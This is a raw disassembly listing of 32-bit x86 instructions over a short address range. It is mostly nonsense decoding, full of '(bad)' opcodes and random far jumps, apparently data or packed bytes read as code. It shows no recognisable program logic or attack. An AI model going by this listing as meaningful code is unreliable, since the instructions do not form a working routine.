  412125:	sub    BYTE PTR [ecx],bl
  412127:	mov    fs,WORD PTR [edx+0x4d]
  41212a:	sbb    eax,0x352a2048
  41212f:	xchg   edx,eax
  412130:	or     ecx,ebx
  412132:	out    dx,al
  412133:	icebp  
  412134:	push   cs
  412135:	mov    ebp,0xd22f02db
  41213a:	lahf   
  41213b:	sbb    DWORD PTR [esi+0x60ac2ad6],eax
  412141:	pop    ebp
  412142:	mov    ch,bl
  412144:	icebp  
  412145:	(bad)  
  412146:	pop    ds
  412147:	lahf   
  412148:	sub    bh,BYTE PTR [ecx-0x56]
  41214b:	adc    al,0x80
  41214d:	mov    esp,0xc348ea11
  412152:	aad    0x94
  412154:	rcl    BYTE PTR [edi-0x7438ecb4],0xc2
  41215b:	and    DWORD PTR [edx+eax*1+0x5ce9d990],esp
  412162:	shr    cl,0xc2
  412165:	mov    WORD PTR [esi+eax*2-0x35],cs
  412169:	fild   WORD PTR [edi]
  41216b:	push   esp
  41216c:	int3   
  41216d:	stc    
  41216e:	cmp    DWORD PTR [ecx],esp
  412170:	imul   ebx,DWORD PTR [edx+0x5b],0xffffffd0
  412174:	(bad)  
  412175:	(bad)  
  412176:	cmp    BYTE PTR [ebp+0x7ddc1884],al
  41217c:	sub    cl,BYTE PTR [edi]
  41217e:	sbb    eax,DWORD PTR [ebx-0x1026bf8]
  412184:	js     0x412119
  412186:	ins    BYTE PTR es:[edi],dx
  412187:	(bad)  
  412188:	js     0x412192
  41218a:	jge    0x412164
  41218c:	cmp    DWORD PTR [ebx-0xf],0x17
  412190:	int    0x7b
  412192:	mov    ebx,0x580eddf7
  412197:	inc    BYTE PTR [edx-0x49]
  41219a:	jne    0x412163
  41219c:	mul    DWORD PTR [edi-0x56]
  41219f:	in     al,0xe9
  4121a1:	mov    bh,0x1b
  4121a3:	cld    
  4121a4:	and    eax,0x67bea26f
  4121a9:	mov    esi,0x800d1b2f
  4121ae:	test   DWORD PTR [esi+0x58],0x48471c30
  4121b5:	dec    esp
  4121b6:	test   al,0x5a
  4121b8:	push   edx
  4121b9:	pop    eax
  4121ba:	xor    DWORD PTR [ecx+0x30dfb79d],edx
  4121c0:	dec    edi
  4121c1:	ja     0x4121bc
  4121c3:	pop    es
  4121c4:	pop    esp
  4121c5:	lahf   
  4121c6:	xor    al,0x23
  4121c8:	ss jmp 0x33c5:0x16131ac3
  4121d0:	aas    
  4121d1:	jle    0x41221a
  4121d3:	cld    
  4121d4:	call   0xca17:0x62f8891f
  4121db:	mov    al,ds:0x3158933d
  4121e0:	cli    
  4121e1:	cld    
  4121e2:	dec    esi
  4121e3:	lock mov eax,0x86ddb744
  4121e9:	loopne 0x4121e6
  4121eb:	xchg   ecx,eax
  4121ec:	out    dx,al
  4121ed:	mov    esp,0x54192e89
  4121f2:	fmul   QWORD PTR [ebx+0x64c3305a]
  4121f8:	aam    0x5
  4121fa:	xor    eax,esp
  4121fc:	fwait
  4121fd:	push   ebx
  4121fe:	ins    BYTE PTR es:[edi],dx
  4121ff:	xchg   ecx,eax
  412200:	test   al,0xc1
  412202:	sysexit 
  412204:	js     0x412195
  412206:	idiv   DWORD PTR [esi]
  412208:	push   edi
  412209:	and    ah,dl
  41220b:	jmp    0x3721f7f4
  412210:	call   0x2ae772bd
  412215:	repnz scas eax,DWORD PTR es:[edi]
  412217:	pop    edx
  412218:	pop    ebp
  412219:	ss clc 
  41221b:	cld    
  41221c:	xor    eax,0x43fcd5c9
  412221:	sbb    ch,BYTE PTR [esi]
  412223:	mov    ch,0x3
  412225:	mov    WORD PTR [edi],?
  412227:	inc    esi
  412228:	ret    0x40ee
  41222b:	mov    ebp,0x360e8999
  412230:	and    ebx,esi
  412232:	jmp    0x4121d6
  412234:	into   
  412235:	cmc    
  412236:	in     eax,0x8b
  412238:	mov    ch,0xf6
  41223a:	or     al,0xca
  41223c:	cmp    DWORD PTR [eax-0x21],edx
  41223f:	jnp    0x4121cd
  412241:	push   es
  412242:	sbb    al,0xfe
  412244:	adc    al,0xb7
  412246:	sti    
  412247:	popf   
  412248:	sbb    DWORD PTR ds:0x6a1b1c2d,edi
  41224e:	sbb    al,0xf3
  412250:	add    DWORD PTR [eax*4-0x38b4703a],ecx
  412257:	mov    eax,0x8d50820c
  41225c:	stos   DWORD PTR es:[edi],eax
  41225d:	aad    0x6e
  41225f:	(bad)  
  412260:	shr    DWORD PTR [eax],0x68
  412263:	xor    esi,DWORD PTR ds:0x2a9abc50
  412269:	cs nop
  41226b:	xor    esp,DWORD PTR [esi]
  41226d:	shl    BYTE PTR [ecx+ecx*2-0x39e038a1],cl
  412274:	mov    ecx,0x370636c1
  412279:	js     0x412216
  41227b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41227c:	xchg   BYTE PTR [edi],dh
  41227e:	stos   DWORD PTR es:[edi],eax
  41227f:	and    eax,0x90723492
  412284:	jmp    0x2341:0xa833d059
  41228b:	push   ds
  41228c:	mov    ?,WORD PTR [edx+0x1ba9d47f]
  412292:	or     al,0xc
  412294:	cmp    al,0xb1
  412296:	xor    al,0x82
  412298:	lahf   
  412299:	scas   al,BYTE PTR es:[edi]
  41229a:	loop   0x412222
  41229c:	adc    al,0x14
  41229e:	inc    edx
  41229f:	hlt    
  4122a0:	dec    esi
  4122a1:	dec    ecx
  4122a2:	push   esi
  4122a3:	mov    cl,0xe2
  4122a5:	mov    ch,0x46
  4122a7:	outs   dx,BYTE PTR ds:[esi]
  4122a8:	pop    edi
  4122a9:	mov    al,ds:0xa0171890
  4122ae:	adc    BYTE PTR [edx],0xa0
  4122b1:	mov    ebp,ss
  4122b3:	bound  esp,QWORD PTR ds:0x7b74c26
  4122b9:	mov    ch,BYTE PTR [edi]
  4122bb:	pop    ecx
  4122bc:	fs push edi
  4122be:	sub    al,0xb9
  4122c0:	jmp    0x6fd41f78
  4122c5:	jne    0x4122fa
  4122c7:	stos   DWORD PTR es:[edi],eax
  4122c8:	jl     0x4122b4
  4122ca:	push   cs
  4122cb:	xchg   esp,eax
  4122cc:	repnz cmp eax,0x145dfd28
  4122d2:	mov    WORD PTR [eax],ds
  4122d4:	stos   BYTE PTR es:[edi],al
  4122d5:	push   ecx
  4122d6:	test   ecx,eax
  4122d8:	mov    bh,0x2d
  4122da:	sahf   
  4122db:	xchg   DWORD PTR [ebx+ebp*4+0x20],edx
  4122df:	fst    DWORD PTR [bx+di]
  4122e2:	cmp    eax,0xa5541396
  4122e7:	xchg   edi,eax
  4122e8:	jbe    0x412278
  4122ea:	pop    es
  4122eb:	dec    esi
  4122ec:	inc    edi
  4122ed:	sti    
  4122ee:	sbb    edx,DWORD PTR [eax+0x3323d97e]
  4122f4:	imul   eax,DWORD PTR [esi],0x74
  4122f7:	int3   
  4122f8:	fistp  DWORD PTR [ebx+eiz*1+0x23e6465c]
  4122ff:	mov    BYTE PTR [esi+0x6d91413e],dl
  412305:	mov    dl,0x28
  412307:	and    eax,DWORD PTR [ebp-0x6b2c2783]
  41230d:	cli    
  41230e:	test   BYTE PTR [ecx],dh
  412310:	out    dx,eax
  412311:	xor    eax,DWORD PTR [ebp-0x1a]
  412314:	jbe    0x412371
  412316:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412317:	inc    edx
  412318:	xor    BYTE PTR [esi+ebx*4-0x751a7613],al
  41231f:	test   BYTE PTR [ebx],bh
  412321:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412322:	mov    BYTE PTR [ecx],ah
  412324:	mov    WORD PTR [eax],es
  412326:	in     eax,dx
  412327:	sbb    BYTE PTR [ebx+0x39],dh
  41232a:	adc    BYTE PTR [esp+eiz*4+0x25],bl
  41232e:	mov    edi,0x342e3694
  412333:	lods   al,BYTE PTR ds:[esi]
  412334:	data16 adc al,BYTE PTR [bp+di-0x4a]
  412339:	sbb    cl,BYTE PTR [ebx+0x76]
  41233c:	jb     0x41237d
  41233e:	hlt    
  41233f:	fiadd  DWORD PTR [ecx-0x6dbade5b]
  412345:	in     eax,0x7
  412347:	ss scas al,BYTE PTR es:[edi]
  412349:	pop    ecx
  41234a:	xchg   DWORD PTR [bp+si-0x795d],esp
  41234f:	mov    esi,DWORD PTR [ecx]
  412351:	mov    BYTE PTR [ebp-0x10133ace],cl
  412357:	scas   al,BYTE PTR es:[edi]
  412358:	das    
  412359:	xor    dl,al
  41235b:	dec    edi
  41235c:	clc    
  41235d:	out    dx,al
  41235e:	xchg   ebp,eax
  41235f:	sbb    DWORD PTR [esi+0x321bc71f],esi
  412365:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412366:	loope  0x412344
  412368:	mov    DWORD PTR [edi-0x26d105df],esi
  41236e:	daa    
  41236f:	adc    DWORD PTR [eax+eiz*4+0x71b881c0],edx
  412376:	mov    DWORD PTR [edx+0x70],ebp
  412379:	loop   0x412396
  41237b:	mov    esp,fs
  41237d:	enter  0xaead,0x3a
  412381:	sahf   
  412382:	out    dx,eax
  412383:	pop    ebx
  412384:	pusha  
  412385:	jo     0x41235f
  412387:	lea    eax,[ecx]
  412389:	sub    dl,BYTE PTR [edi-0x2]
  41238c:	mov    esp,0xab08e83c
  412391:	test   DWORD PTR [edx],0xf3fc3d27
  412397:	sub    DWORD PTR [eax-0x5e],0xffffff9f
  41239b:	or     eax,0x844a68b2
  4123a0:	push   ds
  4123a1:	xchg   esi,eax
  4123a2:	mov    edi,0x8b49fed0
  4123a7:	or     edi,eax
  4123a9:	aad    0xa0
  4123ab:	mov    ?,WORD PTR [ebx+0x47]
  4123ae:	mov    eax,ds:0x119e3083
  4123b3:	mov    ch,0x1b
  4123b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123b6:	inc    ecx
  4123b7:	js     0x41235b
  4123b9:	test   al,0x3b
  4123bc:	cmp    eax,0x2b086672
  4123c1:	and    DWORD PTR [esp+ebx*4],esi
  4123c4:	stc    
  4123c5:	jo     0x4123de
  4123c7:	jle    0x41239d
  4123c9:	scas   eax,DWORD PTR es:[edi]
  4123ca:	sbb    eax,0xb9c2f4ff
  4123cf:	(bad)
  4123d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123d4:	aaa    
  4123d5:	mov    ebx,0x7c63083e
  4123da:	std    
  4123db:	icebp  
  4123dc:	aaa    
  4123dd:	sub    bh,BYTE PTR [eax+0x3]
  4123e0:	and    bl,BYTE PTR [ebp+0x17ce79e8]
  4123e6:	and    eax,0x265d5b51
  4123eb:	push   edi
  4123ec:	mov    al,ds:0xa2cc95b1
  4123f1:	mov    al,0xeb
  4123f3:	push   0xffffff81
  4123f5:	mov    dl,0x55
  4123f7:	dec    esi
  4123f8:	in     al,0xe0
  4123fa:	iret   
  4123fb:	push   es
  4123fc:	clc    
  4123fd:	aas    
  4123fe:	cs addr16 popa 
  412401:	idiv   DWORD PTR [ebp-0x470d1014]
  412407:	pop    ds
  412408:	inc    edx
  412409:	jp     0x4123b1
  41240b:	retf   0x5e83
  41240e:	push   edi
  41240f:	ror    DWORD PTR [ebp+esi*4+0x2e],cl
  412413:	inc    esi
  412414:	arpl   si,cx
  412416:	aaa    
  412417:	lds    edx,FWORD PTR [esi-0x136f838f]
  41241d:	xor    ebp,DWORD PTR [edi+0x0]
  412420:	retfw  
  412422:	jp     0x412419
  412424:	xor    al,0x4c
  412426:	aad    0x48
  412428:	cmc    
  412429:	and    DWORD PTR [ebx+0x169d135c],ecx
  41242f:	shl    DWORD PTR [ecx],0x2f
  412432:	sub    ebx,esp
  412434:	and    bl,BYTE PTR [eax+0x2]
  412437:	jnp    0x41244f
  412439:	xor    cl,bl
  41243b:	(bad)  
  41243c:	fisub  WORD PTR [eax-0x1652885e]
  412442:	adc    dl,BYTE PTR [ebp-0x50db2798]
  412448:	xchg   DWORD PTR [edx+ecx*1],esi
  41244b:	dec    edx
  41244c:	dec    esi
  41244d:	or     ebx,DWORD PTR [ecx+0x4c]
  412450:	shl    DWORD PTR [eax+0x70],cl
  412453:	imul   ebp,DWORD PTR [ebp+0x76],0x40
  412457:	pushf  
  412458:	out    dx,al
  412459:	scas   eax,DWORD PTR es:[edi]
  41245a:	sub    esi,DWORD PTR [eax-0x75]
  41245d:	or     DWORD PTR fs:[ecx+0x36],0xc26a188f
  412465:	push   0x21a8ac82
  41246a:	mov    edx,0xfc8c993
  41246f:	xor    eax,0x136fa02
  412474:	and    DWORD PTR [ecx-0x22783faf],ecx
  41247a:	jbe    0x412497
  41247c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41247d:	jmp    DWORD PTR [eax+edi*2-0x61]
  412481:	int    0x69
  412483:	inc    esp
  412484:	sahf   
  412485:	mov    ebx,0x8a809f94
  41248a:	imul   ebp,DWORD PTR [edx-0x58],0xccefe527
  412491:	cs push ds
  412493:	xor    ecx,DWORD PTR [ebp-0x7]
  412496:	mov    bl,0x35
  412498:	jle    0x412426
  41249a:	push   ebp
  41249b:	sub    al,0x4a
  41249d:	jg     0x412495
  41249f:	dec    edi
  4124a0:	fsubp  st(5),st
  4124a2:	ret    0xfafb
  4124a5:	cwde   
  4124a6:	push   esi
  4124a7:	stc    
  4124a8:	daa    
  4124a9:	sub    edx,DWORD PTR [edx+0x76]
  4124ac:	outs   dx,DWORD PTR ds:[esi]
  4124ad:	(bad)  
  4124af:	jmp    0xb310:0xe433ddea
  4124b6:	jne    0x41243d
  4124b8:	dec    eax
  4124b9:	dec    eax
  4124ba:	loop   0x4124d0
  4124bc:	in     al,dx
  4124bd:	int    0x8a
  4124bf:	fdivr  QWORD PTR [edx+0x2c14612c]
  4124c5:	(bad)  
  4124c7:	mov    eax,0x6165c1df
  4124cc:	jecxz  0x4124e9
  4124ce:	sub    eax,0x82b14cc
  4124d3:	repnz fisub WORD PTR [ebx]
  4124d6:	fidivr DWORD PTR [eax+ebx*1-0x4bcb990b]
  4124dd:	sub    DWORD PTR [ebp-0x77],ebx
  4124e0:	xlat   BYTE PTR ds:[ebx]
  4124e1:	push   edx
  4124e2:	dec    eax
  4124e3:	add    ebx,eax
  4124e5:	xchg   ecx,eax
  4124e6:	dec    esi
  4124e7:	jmp    0x41f8:0x673fedcb
  4124ee:	or     bh,BYTE PTR [edi]
  4124f0:	lods   eax,DWORD PTR ds:[esi]
  4124f1:	lods   al,BYTE PTR ds:[esi]
  4124f2:	bound  eax,QWORD PTR [ecx+0x5f]
  4124f5:	sub    eax,0xdc46d03a
  4124fa:	add    bh,BYTE PTR [esi+0x1a8224ac]
  412500:	xor    BYTE PTR ds:0x37a305b9,0x6c
  412507:	jp     0x4124d3
  412509:	ds pop edx
  41250b:	cmp    ebp,esi
  41250d:	hlt    
  41250e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41250f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412510:	xchg   ebx,eax
  412511:	or     ebx,DWORD PTR ds:0x7a0dbcd3
  412517:	loop   0x412502
  412519:	jnp    0x412559
  41251b:	jns    0x41257b
  41251d:	stos   BYTE PTR es:[edi],al
  41251e:	xchg   esi,eax
  41251f:	adc    cl,bl
  412521:	add    ecx,DWORD PTR [esi+0x2845b11c]
  412527:	push   eax
  412528:	xor    eax,0x3df3d0de
  41252d:	sti    
  41252e:	aam    0x19
  412530:	or     edi,edx
  412532:	pop    es
  412533:	dec    ecx
  412534:	cmc    
  412535:	in     al,0x94
  412537:	mov    ds:0x6990b00,eax
  41253c:	mov    ds:0xaad065e8,al
  412541:	and    al,0x2e
  412543:	xlat   BYTE PTR ds:[ebx]
  412544:	test   DWORD PTR [ebp-0x22b8a439],edx
  41254a:	cmp    bl,BYTE PTR [edx+0x7a]
  41254d:	inc    esi
  41254e:	and    eax,0x8f2b6e5e
  412553:	(bad)  
  412554:	lods   al,BYTE PTR ds:[esi]
  412555:	stos   DWORD PTR es:[edi],eax
  412556:	out    0xd4,al
  412558:	cmp    esi,eax
  41255a:	lock inc esp
  41255c:	add    dl,BYTE PTR [edi+0x33]
  41255f:	mov    bh,0x39
  412561:	sbb    BYTE PTR [esi],cl
  412563:	dec    esi
  412564:	(bad)  
  412565:	loope  0x4125cc
  412567:	clc    
  412568:	adc    BYTE PTR cs:[esi-0x6a],0x3c
  41256d:	adc    eax,0x79dbc7df
  412572:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  412574:	mov    cs,WORD PTR [edx+ebx*8]
  412577:	add    al,0x37
  412579:	aam    0x45
  41257b:	push   edx
  41257c:	test   eax,0x2d5c868c
  412581:	retf   0xdd1
  412584:	icebp  
  412585:	inc    eax
  412586:	jae    0x412517
  412588:	mov    gs,WORD PTR [ebx+edx*4+0x1c]
  41258c:	fcomi  st,st(1)
  41258e:	push   ecx
  41258f:	ret    0x5b9e
  412592:	dec    esp
  412593:	hlt    
  412594:	pusha  
  412595:	or     BYTE PTR [edi+eax*8],cl
  412598:	shl    BYTE PTR ds:[ebp-0x318185c6],cl
  41259f:	adc    al,BYTE PTR [edi-0x287ecfb7]
  4125a5:	dec    esp
  4125a6:	aaa    
  4125a7:	imul   esi,esp,0x55f35c26
  4125ad:	in     eax,dx
  4125ae:	clc    
  4125af:	and    esp,DWORD PTR [ebp-0x2e]
  4125b2:	or     al,0xa2
  4125b4:	adc    eax,0xfdc631a1
  4125b9:	mov    gs,WORD PTR [edx+0x37c43620]
  4125bf:	push   ecx
  4125c0:	sub    eax,0x721a1718
  4125c5:	mov    eax,0x1359ff01
  4125ca:	lds    esi,FWORD PTR [edi+ebp*1-0x38]
  4125ce:	cwde   
  4125cf:	pop    ds
  4125d0:	mov    dh,0xec
  4125d2:	xor    ecx,edi
  4125d4:	jmp    0x412650
  4125d6:	out    0xe8,eax
  4125d8:	pop    es
  4125d9:	out    0x4b,eax
  4125db:	mov    edi,0x566b2e2c
  4125e0:	ret    0x3612
  4125e3:	cwde   
  4125e4:	fldenv [edi-0x46a9cbd9]
  4125ea:	fisttp QWORD PTR [edi-0x5e]
  4125ed:	pop    edi
  4125ee:	push   cs
  4125ef:	mov    WORD PTR [ebp+0x76fd9e3],gs
  4125f5:	push   edi
  4125f6:	xlat   BYTE PTR ds:[ebx]
  4125f7:	add    DWORD PTR [esi-0x4b7a4fea],ebx
  4125fd:	jb     0x412653
  4125ff:	and    ch,bl
  412601:	add    ebx,esi
  412603:	mov    ebx,DWORD PTR [ebx+0x180819f]
  412609:	mov    edi,0xa7392549
  41260e:	mov    bh,BYTE PTR [esi+0x11]
  412611:	dec    DWORD PTR [eax-0x6c25f886]
  412617:	mov    ecx,0x3516212b
  41261c:	out    dx,al
  41261d:	(bad)  
  41261e:	dec    esp
  41261f:	rcl    esi,0xa5
  412622:	mov    edi,0x9fcb15f7
  412627:	inc    edx
  412628:	cli    
  412629:	jmp    0x4125c8
  41262b:	jl     0x412669
  41262d:	mov    ebp,0x3b6b2036
  412632:	push   es
  412633:	sbb    bh,BYTE PTR [esi-0x103fa6bf]
  412639:	nop
  41263a:	sbb    al,0x60
  41263c:	mov    ah,0xe
  41263e:	add    DWORD PTR [edi+eiz*4-0x46],ecx
  412642:	and    al,0xff
  412644:	xchg   edx,eax
  412645:	rcr    BYTE PTR [edi+0x3842b986],1
  41264b:	add    al,0xfe
  41264d:	adc    al,0x78
  41264f:	lods   al,BYTE PTR ds:[esi]
  412650:	sbb    DWORD PTR [ebx+0x6d9e298f],esi
  412656:	sbb    DWORD PTR [ecx],ebp
  412658:	push   es
  412659:	retf   
  41265a:	out    0xed,al
  41265c:	jmp    0x412621
  41265e:	jge    0x412637
  412660:	dec    esp
  412661:	adc    ch,BYTE PTR [esi-0x6e1c33f4]
  412667:	test   DWORD PTR [eax],0xd5d5010
  41266d:	cwde   
  41266e:	mov    WORD PTR [edi-0x59],gs
  412671:	stc    
  412672:	jnp    0x4126dc
  412674:	cld    
  412675:	ins    BYTE PTR es:[edi],dx
  412676:	aad    0x14
  412678:	gs int 0x16
  41267b:	out    dx,al
  41267c:	jge    0x4126ba
  41267e:	cs jo  0x412639
  412681:	mov    edx,0x1c620542
  412686:	sub    al,0xfe
  412688:	cs int 0x0
  41268b:	addr16 jge 0x412626
  41268e:	jno    0x412644
  412690:	sahf   
  412691:	stos   BYTE PTR es:[edi],al
  412692:	adc    al,0x94
  412694:	xchg   esi,eax
  412695:	push   cs
  412696:	cmp    BYTE PTR [ebx+0x4b],bl
  412699:	(bad)  
  41269b:	add    eax,0xf8d1736b
  4126a0:	stos   BYTE PTR es:[edi],al
  4126a1:	xor    ebp,DWORD PTR [edx-0x5c584e8b]
  4126a7:	in     eax,dx
  4126a8:	xor    al,0x83
  4126aa:	push   ecx
  4126ab:	lock or al,0xfc
  4126ae:	aad    0xf0
  4126b0:	arpl   WORD PTR [edi+0xce9b0ce],dx
  4126b6:	jno    0x4126dd
  4126b8:	pop    ebp
  4126b9:	xchg   DWORD PTR [ecx-0x20],ebp
  4126bc:	into   
  4126bd:	sub    BYTE PTR [eax+0xb51e6ff],ch
  4126c3:	cmp    BYTE PTR [eax+0x6e],0x6e
  4126c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126c8:	sbb    eax,0x6e82f469
  4126cd:	aas    
  4126ce:	jne    0x4126e3
  4126d0:	call   0x5977a480
  4126d5:	nop
  4126d6:	inc    edi
  4126d7:	inc    eax
  4126d8:	ja     0x4126d8
  4126da:	js     0x412757
  4126dc:	xchg   ecx,eax
  4126dd:	addr16 mov dl,0x81
  4126e0:	rcr    cl,0x16
  4126e3:	and    BYTE PTR [edi+0x3b21337],0x85
  4126ea:	jb     0x412756
  4126ec:	and    al,0x5f
  4126ee:	fwait
  4126ef:	adc    eax,0xf3c88e97
  4126f4:	adc    DWORD PTR [eax],esi
  4126f6:	add    cl,cl
  4126f8:	sub    eax,ebp
  4126fa:	push   esp
  4126fb:	push   ss
  4126fc:	out    dx,al
  4126fd:	rcr    BYTE PTR [esi+0x58],cl
  412700:	fdiv   QWORD PTR [ecx]
  412702:	int3   
  412703:	sub    cl,cl
  412705:	adc    ebp,eax
  412707:	dec    ecx
  412708:	mov    ebx,0x604946b4
  41270d:	shr    DWORD PTR [eax+0x48],0x2
  412711:	bound  esi,QWORD PTR [ecx]
  412713:	cmc    
  412714:	mov    eax,ds:0xc947d9b8
  412719:	xchg   bl,ch
  41271b:	push   ss
  41271c:	mov    eax,esp
  41271e:	dec    esp
  41271f:	xchg   esp,eax
  412720:	outs   dx,DWORD PTR ds:[esi]
  412721:	js     0x412786
  412723:	sbb    al,0x7f
  412725:	inc    esp
  412726:	or     eax,DWORD PTR [edi-0x7b3ae554]
  41272c:	ret    0x9d54
  41272f:	pop    edi
  412730:	jmp    0x412728
  412732:	ins    DWORD PTR es:[edi],dx
  412733:	mov    edx,0x6bd31add
  412738:	mov    WORD PTR [eax+0x0],gs
  41273b:	shl    cl,cl
  41273d:	ins    DWORD PTR es:[edi],dx
  41273e:	(bad)  
  41273f:	adc    al,BYTE PTR [edi]
  412741:	dec    edx
  412742:	jns    0x4126db
  412744:	dec    esp
  412745:	adc    eax,0x4a2edd04
  41274a:	pop    edx
  41274b:	mov    dl,0x91
  41274d:	jbe    0x412740
  41274f:	mov    dl,0x53
  412751:	or     ah,BYTE PTR [esi-0x4fc97051]
  412757:	sub    bl,ah
  412759:	pushf  
  41275a:	cmp    al,0x14
  41275c:	and    dl,bl
  41275e:	inc    eax
  41275f:	js     0x4127d4
  412761:	sub    BYTE PTR [eax+0x2e],bh
  412764:	mov    al,0xdc
  412766:	mov    ch,0x2f
  412768:	aaa    
  412769:	(bad)  
  41276a:	jg     0x412797
  41276c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41276d:	mov    eax,0x41700a3b
  412772:	mov    eax,ds:0x9336e23f
  412777:	cmp    al,0xee
  412779:	cs fucom st(7)
  41277c:	addr16 or al,0x30
  41277f:	pop    ebp
  412780:	out    0xbf,al
  412782:	shl    BYTE PTR [ebx-0x42],0xb
  412786:	and    eax,0x366668ea
  41278b:	ins    DWORD PTR es:[edi],dx
  41278c:	mov    al,ds:0x5f54bd01
  412791:	and    edi,esp
  412793:	mov    BYTE PTR [edi+0x61],ch
  412796:	leave  
  412797:	popa   
  412798:	shl    DWORD PTR [esi+0x6],cl
  41279b:	jg     0x4127cc
  41279d:	mov    BYTE PTR [edx-0x7c153ee6],dl
  4127a3:	sub    BYTE PTR [edi+0x3d],ch
  4127a6:	dec    esi
  4127a7:	xchg   edx,eax
  4127a8:	lock jecxz 0x412743
  4127ab:	ds mov dh,0x33
  4127ae:	into   
  4127af:	and    edi,0xfffffff3
  4127b2:	lds    edx,FWORD PTR [esi+0x2874acae]
  4127b8:	jge    0x412829
  4127ba:	inc    edi
  4127bb:	xchg   eax,esp
  4127bd:	push   edx
  4127be:	pushf  
  4127bf:	jmp    0x4127a5
  4127c1:	int3   
  4127c2:	sbb    cl,BYTE PTR [ebx]
  4127c4:	jns    0x4127db
  4127c6:	fcom   QWORD PTR [ebx+edx*4-0x4c85a090]
  4127cd:	fmul   QWORD PTR [esi+0x176008f1]
  4127d3:	or     al,dl
  4127d5:	imul   DWORD PTR [ebx]
  4127d7:	iret   
  4127d8:	pop    ss
  4127d9:	mov    bh,0xf8
  4127db:	jno    0x4127d5
  4127dd:	add    ch,BYTE PTR [eax]
  4127df:	inc    ebp
  4127e0:	mul    BYTE PTR [ebx+0x4fb41232]
  4127e6:	ja     0x412831
  4127e8:	mov    bh,0x96
  4127ea:	cmp    eax,0x65ca88ff
  4127ef:	add    ah,al
  4127f1:	dec    ebp
  4127f2:	stos   BYTE PTR es:[edi],al
  4127f3:	call   0xe914:0xcdef2873
  4127fa:	in     al,dx
  4127fb:	add    BYTE PTR [eax+0xe15a6f7],ch
  412801:	and    BYTE PTR [esi+eax*1+0x61],ch
  412805:	mov    eax,ds:0xfa418179
  41280a:	or     eax,0xc2bce9ec
  41280f:	fwait
  412810:	in     eax,dx
  412811:	lods   eax,DWORD PTR ds:[esi]
  412812:	jl     0x4127f7
  412814:	mov    bl,BYTE PTR [ecx-0x3e]
  412817:	add    al,0xc5
  412819:	add    eax,0xefe792f5
  41281e:	inc    edx
  41281f:	iret   
  412820:	sub    DWORD PTR [eax*2-0x2357aee1],edx
  412827:	stos   DWORD PTR es:[edi],eax
  412828:	fs push ecx
  41282a:	nop
  41282b:	push   edx
  41282c:	sar    BYTE PTR [esi+0x390a933e],cl
  412832:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412833:	mov    edi,0x3f6c5ab2
  412838:	rcr    ecx,cl
  41283a:	push   0xca967008
  41283f:	icebp  
  412840:	fldenv [ecx]
  412842:	pusha  
  412843:	sub    al,0x2d
  412845:	push   0xffffff9f
  412847:	scas   al,BYTE PTR es:[edi]
  412848:	into   
  412849:	sub    BYTE PTR [esi-0x36],dh
  41284c:	or     al,0xe4
  41284e:	or     BYTE PTR [eax+0x33],ch
  412851:	mov    cs,WORD PTR [ebp+0x340fdb87]
  412857:	sbb    DWORD PTR [edi+ebp*4],ebp
  41285a:	dec    esp
  41285b:	add    al,BYTE PTR [ecx]
  41285d:	jecxz  0x412873
  41285f:	pop    es
  412860:	sbb    BYTE PTR [esi],ch
  412862:	out    0x66,al
  412864:	adc    esp,0x17
  412867:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412868:	out    dx,al
  412869:	fisttp WORD PTR [ebp+eiz*8+0x5d]
  41286d:	fmul   st(2),st
  41286f:	jns    0x4128c6
  412871:	rol    BYTE PTR [esi-0x3a7fa507],0x7b
  412878:	dec    eax
  412879:	repnz outs dx,DWORD PTR fs:[esi]
  41287c:	xchg   BYTE PTR [edi-0x2c],ah
  41287f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412880:	push   ebp
  412881:	or     ah,BYTE PTR [edi+edx*1+0x4e]
  412885:	rol    DWORD PTR [ecx],1
  412887:	icebp  
  412888:	sbb    bl,BYTE PTR [ecx]
  41288a:	mov    ds:0xc329c613,eax
  41288f:	call   0xa90d4ff7
  412894:	(bad)  
  412895:	clc    
  412896:	mov    ds:0x3c3944e3,al
  41289b:	mov    ecx,0xb46d3c09
  4128a0:	test   DWORD PTR [edi],esp
  4128a2:	(bad)  [edx-0x2a]
  4128a5:	or     eax,0xaf877eef
  4128aa:	(bad)
  4128ae:	add    DWORD PTR [eax],ecx
  4128b0:	les    edx,FWORD PTR [edx-0x3f66915c]
  4128b6:	cs cli 
  4128b8:	xchg   DWORD PTR [edi+0x6a77a733],eax
  4128be:	fwait
  4128bf:	addr16 inc ebx
  4128c1:	lock lods eax,DWORD PTR ds:[esi]
  4128c3:	mov    edi,0xda205387
  4128c8:	repnz mov ebp,DWORD PTR [ebp+edx*8+0x65]
  4128cd:	je     0x412946
  4128cf:	sbb    DWORD PTR ds:0x2e261540,ebx
  4128d5:	popa   
  4128d6:	bnd jg 0x412958
  4128d9:	dec    esi
  4128da:	add    eax,0x946667a0
  4128df:	aam    0xcb
  4128e1:	push   edi
  4128e2:	pop    ebp
  4128e3:	jmp    0x412957
  4128e5:	push   edi
  4128e6:	push   es
  4128e7:	loop   0x4128f1
  4128e9:	sub    al,0x9
  4128eb:	ret    
  4128ec:	sbb    BYTE PTR [ebx+ebx*4],ch
  4128ef:	add    DWORD PTR [ecx],ecx
  4128f1:	mov    ch,0x3
  4128f3:	cmp    al,0x5a
  4128f5:	iret   
  4128f6:	xor    dh,BYTE PTR [ebp+edi*8+0x53]
  4128fa:	int    0x7e
  4128fc:	lods   eax,DWORD PTR ds:[esi]
  4128fd:	or     dl,bh
  4128ff:	cmp    bh,BYTE PTR [ecx]
  412901:	push   0x3d4b50d5
  412906:	(bad)  
  412907:	or     DWORD PTR es:[ebx],esp
  41290a:	pop    eax
